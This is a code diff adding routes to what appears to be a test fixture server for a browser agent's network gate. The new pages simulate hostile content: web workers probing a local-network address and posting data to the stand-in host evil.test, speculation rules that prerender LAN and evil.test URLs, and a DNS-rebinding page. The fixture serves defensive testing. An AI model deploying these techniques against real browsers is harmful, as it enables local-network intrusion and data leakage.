@@ -117,6 +117,41 @@ export async function startFixture(): Promise<Fixture> {
         return send(200, html('<form action="/find" method="get"><input name="q" aria-label="Query" value="shirts"><button type="submit">Search</button></form>', 'Search'));
       case 'shop.test/find':
         return send(200, html(`<h1>Found ${new URL(path, 'http://x').searchParams.get('q')}</h1>`, 'Found'));
+      case 'shop.test/workers': {
+        // workers that reach for the owner's network (the lan address in the query) and post to an off-list site.
+        const lan = new URL(path, 'http://x').searchParams.get('lan');
+        const script = `/worker.js?lan=${lan}`;
+        return send(
+          200,
+          html(
+            `<p id="shared">no shared worker</p>
+            <script>new Worker('${script}');
+            if (typeof SharedWorker === 'function') { new SharedWorker('${script}&kind=shared'); document.getElementById('shared').textContent = 'shared worker started'; }</script>`,
+            'Workers',
+          ),
+        );
+      }
+      case 'shop.test/worker.js': {
+        const lan = new URL(path, 'http://x').searchParams.get('lan');
+        return send(
+          200,
+          `fetch('http://127.0.0.5:${lan}/worker-get').catch(() => {});
+          fetch('${at('evil.test', '/worker-post')}', { method: 'POST', body: 'worker-DATA', mode: 'no-cors' }).catch(() => {});
+          try { new WebSocket('ws://127.0.0.5:${lan}/worker-ws'); } catch {}`,
+          'text/javascript',
+        );
+      }
+      case 'shop.test/speculation': {
+        // chrome preloads these pages outside the tab, and the activation of a prerender sends no request.
+        const lan = new URL(path, 'http://x').searchParams.get('lan');
+        const rules = { prerender: [{ source: 'list', urls: [`http://127.0.0.5:${lan}/prerender`, at('evil.test', '/prerender')] }], prefetch: [{ source: 'list', urls: [`http://127.0.0.5:${lan}/prefetch`] }] };
+        return send(200, html(`<script type="speculationrules">${JSON.stringify(rules)}</script><a href="${at('evil.test', '/prerender')}">Prerendered</a>`, 'Speculation'));
+      }
+      case 'shop.test/rebind': {
+        // the gate resolves rebind.test to the fixture, and the test makes chrome resolve it to the lan address.
+        const lan = new URL(path, 'http://x').searchParams.get('lan');
+        return send(200, html(`<img src="http://rebind.test:${lan}/img"><script>fetch('http://rebind.test:${lan}/fetch').catch(() => {})</script>`, 'Rebind'));
+      }
       case 'shop.test/pw-frame':
         // the snapshot also shows the fields of a frame, so a password in a frame must be masked too.
         return send(200, html(`<label>Main pw <input type="password" name="pw" value="MAIN-${FIXTURE_PASSWORD}"></label><iframe src="/pw-inner"></iframe>`, 'Frames'));
